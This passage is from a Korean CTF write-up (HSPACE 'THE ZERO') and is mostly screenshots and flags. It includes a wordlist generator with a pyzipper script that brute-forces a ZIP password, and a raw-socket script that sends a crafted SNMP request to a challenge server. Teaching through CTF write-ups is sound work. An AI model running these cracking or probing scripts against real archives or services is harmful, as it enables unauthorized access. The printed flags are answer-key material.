![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20125.png)

```python
# -*- coding:utf-8 -*-

file_name = "./word3.txt"

"""
		D????on?? (숫자, 영소문자, 영소문자, 영소문자, 영대문자, 숫자)
"""

upper_string = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
lower_string = "abcdefghijklmnopqrstuvwxyz"
number_string = "0123456789"

secret = "D%s%s%s%son%s%s"

with open(file_name, mode="w") as f:
    for u in number_string:
        for v in lower_string:
            for w in lower_string:
                for x in lower_string:
                    for y in upper_string:
                        for z in number_string:
                            # print(secret % (w,x,y,z))
                                f.write(str(secret % (u,v,w,x,y,z)) + "\n")
```

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20126.png)

```python
python3 file2.txt_creack.py
```

```python
import  pyzipper
import  time
from    multiprocessing import Process, Pool

start_time = time.time()
zipfilename = "./file2.txt.zip"
dictionary  = "./word3.txt"

def extract_file(passwords):
    with pyzipper.AESZipFile(zipfilename) as zip_file:
        try:
            zip_file.extractall(pwd=passwords.encode("utf-8"))
        except:
            pass
        else:
            password = "\n[+] Password is: %s [+] \n" % passwords
            print(password)
            print("[---] %s time" % (time.time() - start_time))
            return passwords

def main():
    ps_cnt = 12

		pool   = Pool(processes=ps_cnt)

		with open(dictionary, "r") as f:
		    data   = pool.map(extract_file, [i.strip() for i in f])
		    pool.close()
		    pool.join()

if __name__ == '__main__':
    main()

```

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/2.33.29.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20124.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20127.png)

FLAG: hspace{er3nKLKTy8QXy4s9_ZIP!_ZIP!!}

## [NETWORK] Native

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_1.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_2.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_3.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_4.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_5.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_6.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_7.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_8.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_9.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_10.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_11.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_12.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_13.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_14.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_15.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_16.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_17.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_18.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_19.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Native__v2_20.png)

FLAG: hspace{!cmp_tunn31!n9_c4n_b3_bu!1t_fr0m_p!n9}

## [NETWORK] Custom SNMP

**[출제 의도]**

이 문제는 'SNMP request 시에 어떠한 데이터를 보내는지 이해했는가?'를 의도하고 출제했습니다.

SNMP는 UDP를 사용하는 프로토콜로 특정 oid를 사용하여 값을 응답받을 수 있습니다.

**[풀이]**

```python
# snmp-check -c public 13.124.69.18
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 13.124.69.18:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 13.124.69.18
  Hostname                      : 1.3.6.1.2.1.1.5.0 is deprecate plz 4.0
  Description                   : 1.3.6.1.2.1.1.1.0 is deprecate plz 4.0
  Contact                       : 1.3.6.1.2.1.1.4.0 is deprecate plz 4.0
  Location                      : Sori in Nonsan..
  Uptime snmp                   : noSuchInstance
  Uptime system                 : 1.3.6.1.2.1.1.3.0 is deprecate plz 4.0
  System date                   : -

[*] Network information:

  Default TTL                   : noSuchInstance
  TCP segments received         : noSuchInstance
  TCP segments sent             : noSuchInstance
  TCP segments retrans          : noSuchInstance
  Input datagrams               : noSuchInstance
  Delivered datagrams           : noSuchInstance
  Output datagrams              : noSuchInstance

[*] File system information:

  Index                         : noSuchInstance
  Mount point                   : noSuchInstance
  Access                        : noSuchInstance
  Bootable                      : noSuchInstance
```

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20128.png)

snmpwalk를 사용하여 값을 가져왔을때, deprecate되어 4.0을 호출해야 합니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20129.png)

하지만 SNMP는 request 시 정해진 구조가 있어 4.0을 사용할 수 없습니다.

이미 알려진 oid들은 [http://www.oid-info.com/cgi-bin/display?oid=1.1&a=display](http://www.oid-info.com/cgi-bin/display?oid=1.1&a=display) 에서 검색 가능합니다.

SNMP 패킷을 캡쳐하여 살펴봅시다

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20130.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20131.png)

위의 그림은 public 커뮤니티의 OID 1.0을 요청한 패킷입니다.

0x2a 부분부터 UDP 패킷이고, 0x2e부터 SNMP 패킷입니다.

0x2e 부분은 SNMP version을 나타냅니다. (0x00은 1버전 0x01은 2버전)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20132.png)

위는 패킷 구조입니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20133.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20134.png)

여튼 저튼 쨋든 0x49부분이 object name부분입니다.

이 부분을 천천히 올려서 통신해보면 각 헥스값은 아래와 같습니다.

```python
0xa0 = 4.0
0x78 = 3.0
0x9f = 3.39
0x77 = 2.39
0x50 = 2.0
0x4f = 1.39
0x28 = 1.0
0x27 = 0.39
0x00 = 0.0
```

"\xa0"가 4.0 쿼리인 것을 알 수 있습니다.

```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("13.124.69.18",161))

msg = "\x30\x22\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x15\x02\x04\x24\x6a\x77\x53\x02\x01\x00\x02\x01\x00\x30\x07\x30\x05\x06\x01"
msg += "\xa0" # Mib Query 4.0 = \xa0
msg += "\x05\x00"

s.send(msg)
print(str(s.recv(1024))[36:])
```

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%20135.png)

FLAG: HSPACE{Are_Y0u_Under5T@nd_SNMP?}

## [MISC] EZ_Babymath

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__18.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__19.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__20.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__21.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__22.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__23.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/20210428HSPACE_CTF_1__24.png)

FLAG: hspace{do_the_math_if_you_can!!}